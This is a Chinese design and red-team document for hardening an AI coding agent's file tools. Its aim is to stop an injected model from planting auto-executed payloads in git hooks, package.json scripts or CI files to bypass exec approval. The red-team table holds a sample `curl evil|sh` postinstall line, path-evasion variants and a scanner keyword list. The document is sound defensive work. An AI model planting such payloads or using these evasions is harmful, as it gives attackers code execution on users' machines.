# 第31波 B · shell 沙箱化设计稿 + 红队(edit->exec 本地载荷根治)

> 状态:**设计稿 + 红队完成,施工规格已定;实施(改 server.js edit guard)待确认后下一轮做**。本波不动 server.js。
> 缘起:第27波「自主性授权书」诚实结论自留债--"授权书让 exec 自主性有界/可撤/可审,但**不能让一张 exec 授权书对已被注入的模型变安全**;edit->exec 本地载荷根治需 shell 沙箱化,授权书层无解,单独立项"。
> 纪律:多方案设计 -> 红队对抗 -> 综合推荐 -> 施工规格(沿用第23波起每波纪律)。

## 0. 问题陈述

edit/file_write 工具能写**工作区内但会被自动执行**的文件(.git/hooks/pre-commit、package.json postinstall、.vscode/tasks.json 等)= 潜伏 RCE,**不需 exec 授权**。模型一旦被注入(或本身越轨),可经 edit 植入恶意载荷,等用户下次 git commit / npm install / 构建时触发执行,绕过整个 exec 权限面。

第27波已做 `GRANT_EDIT_AUTOEXEC_DENY` 黑名单(.git/.githooks/.husky/.vscode/tasks.json/launch.json),但:
1. **覆盖窄**:package.json/pyproject 等合法高频编辑项未纳入(整表拉黑会阻断正常开发)。
2. **位置错**(本波核心发现):denylist 挂在**授权书层**(`consumeGrant` 路径),仅对"有授权书的 edit 消耗"生效;**bypass/plan 模式下 edit 写 .git/hooks 不过该检查**--工具层 sink `guardFileToolPath`(:2997)只管工作区边界,不查 autoexec。即现状保护对 bypass 模式是裸的。
3. **黑名单本质不完备**:无法穷举所有自动执行路径。

## 1. 现状对到源码(2026-07-13, HEAD ecf2175)

| 组件 | 位置 | 作用 | 缺口 |
|---|---|---|---|
| `GRANT_EDIT_AUTOEXEC_DENY` | server.js:6139-6142 | edit 档 autoexec 路径黑名单 | **授权书层**:仅 consumeGrant 时查;bypass 模式裸 |
| `consumeGrant` autoexec 检查 | :6301 附近(组件尾点/尾空格归一后匹配) | 命中 -> 回落弹窗 | 只覆盖有 grant 的 edit |
| `guardFileToolPath` | :2997 | 工具层路径护栏(工作区边界 + 敏感路径) | **不查 autoexec** |
| `file_write`/`file_edit`/`file_delete` | :12928 / :12948 / :13004 | 均过 `guardFileToolPath({write:true})` | 三者对称,但都不查 autoexec |
| `git_commit` tier | :5990 | 归 exec(commit 触发 .git/hooks) | 已收口 |
| `:6123` 注释 | -- | "授权书只绕弹窗,不绕 guardFileToolPath" | 确认 guardFileToolPath 是工具执行体 sink,覆盖所有模式 |

**关键结论**:autoexec 检查需**从授权书层下沉到 `guardFileToolPath`**,才能覆盖 bypass/plan/default 全模式。这是 L1 的核心动作。

## 2. 威胁面分类(工作区内会被自动执行的文件)

| 类 | 路径 | 触发时机 | 现状 |
|---|---|---|---|
| Git hooks | `.git/hooks/*`、`.githooks/`、`.husky/`、`core.hooksPath` 指向目录 | git commit/fetch/push | 已黑名单(授权书层) |
| IDE 任务 | `.vscode/tasks.json`、`.vscode/launch.json` | 用户运行任务/调试 | 已黑名单(授权书层) |
| 包管理生命周期 | `package.json` scripts.{preinstall,postinstall,prepare,...}、`pyproject.toml` build hooks、`requirements.txt` + pip 钩子 | npm install / pip install | **未覆盖**(合法高频) |
| CI/CD 配置 | `.github/workflows/*.yml`、`.gitlab-ci.yml`、`Jenkinsfile` | push 触发 CI | **未覆盖** |
| 构建插件 | `webpack.config.js`、`.babelrc.js`、`eslint.config.js`、`vite.config.js` | 构建 require 插件(可 require 任意模块) | **未覆盖**(且属"配置 require 攻击",见下) |
| 显式脚本 | `Makefile`、`*.sh`、`*.ps1` | make / 手动跑 | 写=直接写代码(归 (b) 类) |
| 配置注入 | `.npmrc`、`.env`(被 source)、`.pythonrc.py` | install / shell 启动 | **未覆盖** |

**两类区分**(根治范围的关键)**:**
- **(a) 路径即执行入口**:.git/hooks、package.json scripts、CI yml -- 路径可识别,适合 denylist/标注。
- **(b) 普通代码被 require/import 执行**:app.js、.babelrc.js -- 任何 .js 都可能被 require,路径不可识别。**edit 写 .js 植入恶意代码是正常开发行为**(改代码就是改执行逻辑),无法也不应阻止--这是模型对齐问题,非文件系统权限问题。**本方案不覆盖 (b)**。

## 3. 多方案设计

### 方案1:denylist 扩展(增量)
扩展 `GRANT_EDIT_AUTOEXEC_DENY` 覆盖 CI 路径(.github/workflows/、.gitlab-ci.yml、Jenkinsfile)。
- ✅ 增量、低风险、不改架构。
- ❌ 黑名单本质不完备;package.json scripts 字段级无法拉黑;**不根治**。

### 方案2:autoexec 写后告警(透明化)
维护 autoexec 路径分类表,edit 命中时**不阻止**但检查点标 `autoexec:true` + UI 高亮 + 审计事件。
- ✅ 不阻断合法编辑(package.json scripts 高频);把潜伏风险透明化给用户;符合"授出自主权"知情承担语义。
- ❌ 只告警不阻止;依赖用户警觉。

### 方案3:内容扫描(写后检测恶意 payload)
对 autoexec 路径写入做静态扫描(shell 注入特征 curl|wget|base64|eval|child_process、网络外传特征)。命中 -> 拒/告警。
- ✅ 能抓"postinstall 里藏 curl exfil"具体攻击。
- ❌ 误报高(合法 postinstall 也 curl);特征可绕(编码/混淆);扫描器成对抗面。**半根治,不值**。

### 方案4:执行环境真沙箱(根治但重)
把"会被自动执行的命令"(git commit 触发 hooks、npm install 触发 scripts)放进隔离执行环境(AppContainer/Job Object 限网络文件 / 容器)。
- ✅ **真根治**--写了恶意 hooks 也执行不了外传/破坏。
- ❌ 极重:Windows 沙箱基建复杂、**与零依赖约束冲突**(需引沙箱库/容器运行时)、用户体验受损(构建本需网络/文件访问)、与"单文件零依赖、气隙优先"定位冲突。**不可行于本项目**。

### 方案5:autoexec 写入二次确认 + TTL(折中根治)
edit 写 autoexec 路径 -> 不立即落盘,进"待确认暂存":弹窗展示 diff + "此文件会被自动执行"风险标注,用户确认才落盘 + 进 TTL 审计窗口。
- ✅ 把 autoexec 写入从"静默"变"显式同意",根治"潜伏"性。
- ❌ 每个 package.json 编辑确认=疲劳。可缓解:只对"含 scripts 字段变更"或"会话内首次 autoexec 写入"确认。

## 4. 红队(7 条,各配施工修正)

| # | 攻击 | 修正 |
|---|---|---|
| R1 | **bypass 模式裸**:edit 写 .git/hooks 不过授权书层 denylist,直接执行 | L1:**autoexec 检查下沉到 `guardFileToolPath`**,全模式覆盖(本波核心动作) |
| R2 | **路径变形**:.GIT/hooks(大小写)、.git./hooks(尾点)、.git /hooks(尾空格)、junction、NTFS ADS(.git::$DATA)、短文件名(GIT~1) | 沿用第27波 :6302 组件尾点/尾空格归一;L1 补大小写归一(Windows 不敏感)+ realpath 解 junction;ADS/短名由 realpath 化解 |
| R3 | **package.json scripts 字段植入** `curl evil\|sh`(整表不能拉黑) | L2:package.json 写入且 scripts 字段变更 -> 检查点标 autoexec:true + 审计 + UI 高亮(不阻止,知情承担) |
| R4 | **file_edit vs file_write 不对称**:file_edit 改 package.json scripts 和 file_write 覆盖应同受约束 | L1/L2 挂在 `guardFileToolPath` + file_write/file_edit/file_delete 三入口对称(:12928/:12948/:13004 均过) |
| R5 | **file_delete 删 .git/hooks**(删保护性文件也是攻击面) | L1 覆盖 delete(:13004 已过 guardFileToolPath,加 autoexec 分支即可) |
| R6 | **间接提权(配置 require 攻击)**:edit 写 .babelrc.js require 恶意模块 -> 构建 execute | 归 (b) 类**不阻止**(普通 .js 编辑是开发行为);诚实交代:模型对齐问题非文件系统权限问题,本方案范围外 |
| R7 | **工作区外 autoexec**:edit 写 ~/.git/hooks(用户级) | `guardFileToolPath` 工作区边界已拦(越界 not-allowed);L1 下沉后边界检查仍在 autoexec 之前 |

## 5. 综合推荐:分层防御 L1+L2+L3(不做 L4)

**不做**:方案4(真沙箱,与零依赖/气隙定位冲突)、方案3(内容扫描,误报/对抗面,半根治不值)。
**采用**:
- **L1(硬阻止,下沉+扩展)**:`GRANT_EDIT_AUTOEXEC_DENY` 逻辑**从授权书层下沉到 `guardFileToolPath`**(新增 autoexec 分支,write 模式时检查),全模式覆盖;denylist 扩展 CI 路径(.github/workflows/、.gitlab-ci.yml、Jenkinsfile -- 非高频开发编辑)。package.json/pyproject 仍不拉黑(合法高频)。
- **L2(透明化,package.json scripts)**:file_write/file_edit 写 package.json 且内容含 scripts 字段变更 -> 检查点标 `autoexec:true` + 审计事件 `autoexec-write` + UI 写入日志高亮(不阻断)。
- **L3(审计,全 autoexec 分类表)**:维护 autoexec 路径分类表(git hooks/包管理生命周期/IDE 任务/CI),所有命中写入落 `autoexec-write` 审计事件,UI 标注"⚠ 自动执行文件"。

**纵深语义**:L1 拦已知纯恶意路径(.git/hooks 等非高频)+ L2 透明化高频但可执行(package.json scripts)+ L3 全审计。配合既有检查点 journal(可回滚)+ 授权书(可撤)+ 审计(可审),形成"写了能看见、能回滚、恶意路径能拦"的分层防御。**不追求"写了不执行"(L4 真沙箱)**,因与定位冲突。

## 6. 施工规格(实施待确认,下一轮做)

| 单元 | 改动 | 位置 |
|---|---|---|
| 6.1 | `guardFileToolPath` 新增 autoexec 分支:`write && tool in {file_write,file_edit,file_delete}` 时,对 abs 路径归一(去尾点/尾空格/大小写)+ realpath 解 junction 后,匹配 autoexec denylist -> 命中返回 `{ok:false, code:'autoexec-denied'}` | server.js:2997 guardFileToolPath |
| 6.2 | 抽 `AUTOEXEC_DENYLIST`(从 `GRANT_EDIT_AUTOEXEC_DENY` 提升为工具层常量)+ 扩展 CI 路径;授权书层保留引用(向后兼容,consumeGrant 仍查,纵深) | server.js:6139 |
| 6.3 | file_write/file_edit 写 package.json + scripts 字段变更检测(解析前后 JSON 对比 scripts 键) -> 检查点标 `autoexec:true` + `logEvent({kind:'autoexec-write',...})` | server.js:12928/12948 |
| 6.4 | 前端写入日志高亮 autoexec 标记 | app.js(写入日志渲染) |
| 6.5 | e2e `dev-harness/autonomy-shell-sandbox.e2e.js`(端口 9125):L1 bypass 模式 .git/hooks 被拒/路径变形绕过红队/CI 路径扩展;L2 package.json scripts 写入审计;L3 autoexec-write 事件;file_edit/delete 对称 | dev-harness/ |

**风险**:6.1 下沉到 guardFileToolPath 影响**所有 edit 调用**。L1 只拦 `.git/hooks/` 和 `.git/config`/`.git/config.worktree`（可设 `core.hooksPath` 重定向 hook），不拦工作区根级 `.gitignore`/`.gitattributes`。

## 7. 诚实结论(知情条款)

1. **本方案是"分层防御 + 透明化",非"真沙箱"**:L1 拦已知恶意路径、L2/L3 透明化高频可执行项,但不阻止"普通代码被 require 执行"(R6/(b) 类)。真沙箱(L4)与零依赖/气隙定位冲突,不做。
2. **package.json scripts 仍可被写**(L2 只透明化不阻止):因 postinstall 是合法高频开发操作。模型若植入恶意 postinstall,L2 让用户**知情**(UI 高亮 + 审计),但**不拦**--这是"授出自主权"的定义代价,由用户知情承担。与第27波诚实结论同语义。
3. **L1 下沉是本波最高价值动作**:修了 bypass 模式裸缺口(R1),让 autoexec 保护不再依赖"是否有授权书"。这是第27波诚实债里最该补的一刀。
4. **范围外**:模型对齐(模型本身不越轨)、间接提权(.babelrc.js require 攻击)、工作区外路径(边界已拦)。这些非文件系统权限能解。

## 8. 验收锁(e2e,实施时落地)

- L1 bypass 模式 edit 写 `.git/hooks/pre-commit` -> `code:'autoexec-denied'` 拒收(修 R1)。
- L1 路径变形(.GIT/hooks、.git./hooks、.git /hooks)均拒(R2)。
- L1 扩展路径(.github/workflows/ci.yml、.gitlab-ci.yml、Jenkinsfile)拒。
- L1 `.gitignore`/`.gitattributes` **不误伤**(工作区根级,非 .git/ 内)。
- L1 file_edit/file_delete 与 file_write 对称(都拒 .git/hooks)(R4/R5)。
- L2 package.json scripts 变更 -> 检查点 `autoexec:true` + 审计事件 `autoexec-write`(R3)。
- L3 autoexec 分类表命中 -> 审计事件落 `dataRoot/logs`。
- 授权书层 consumeGrant 仍查(纵深,向后兼容)。
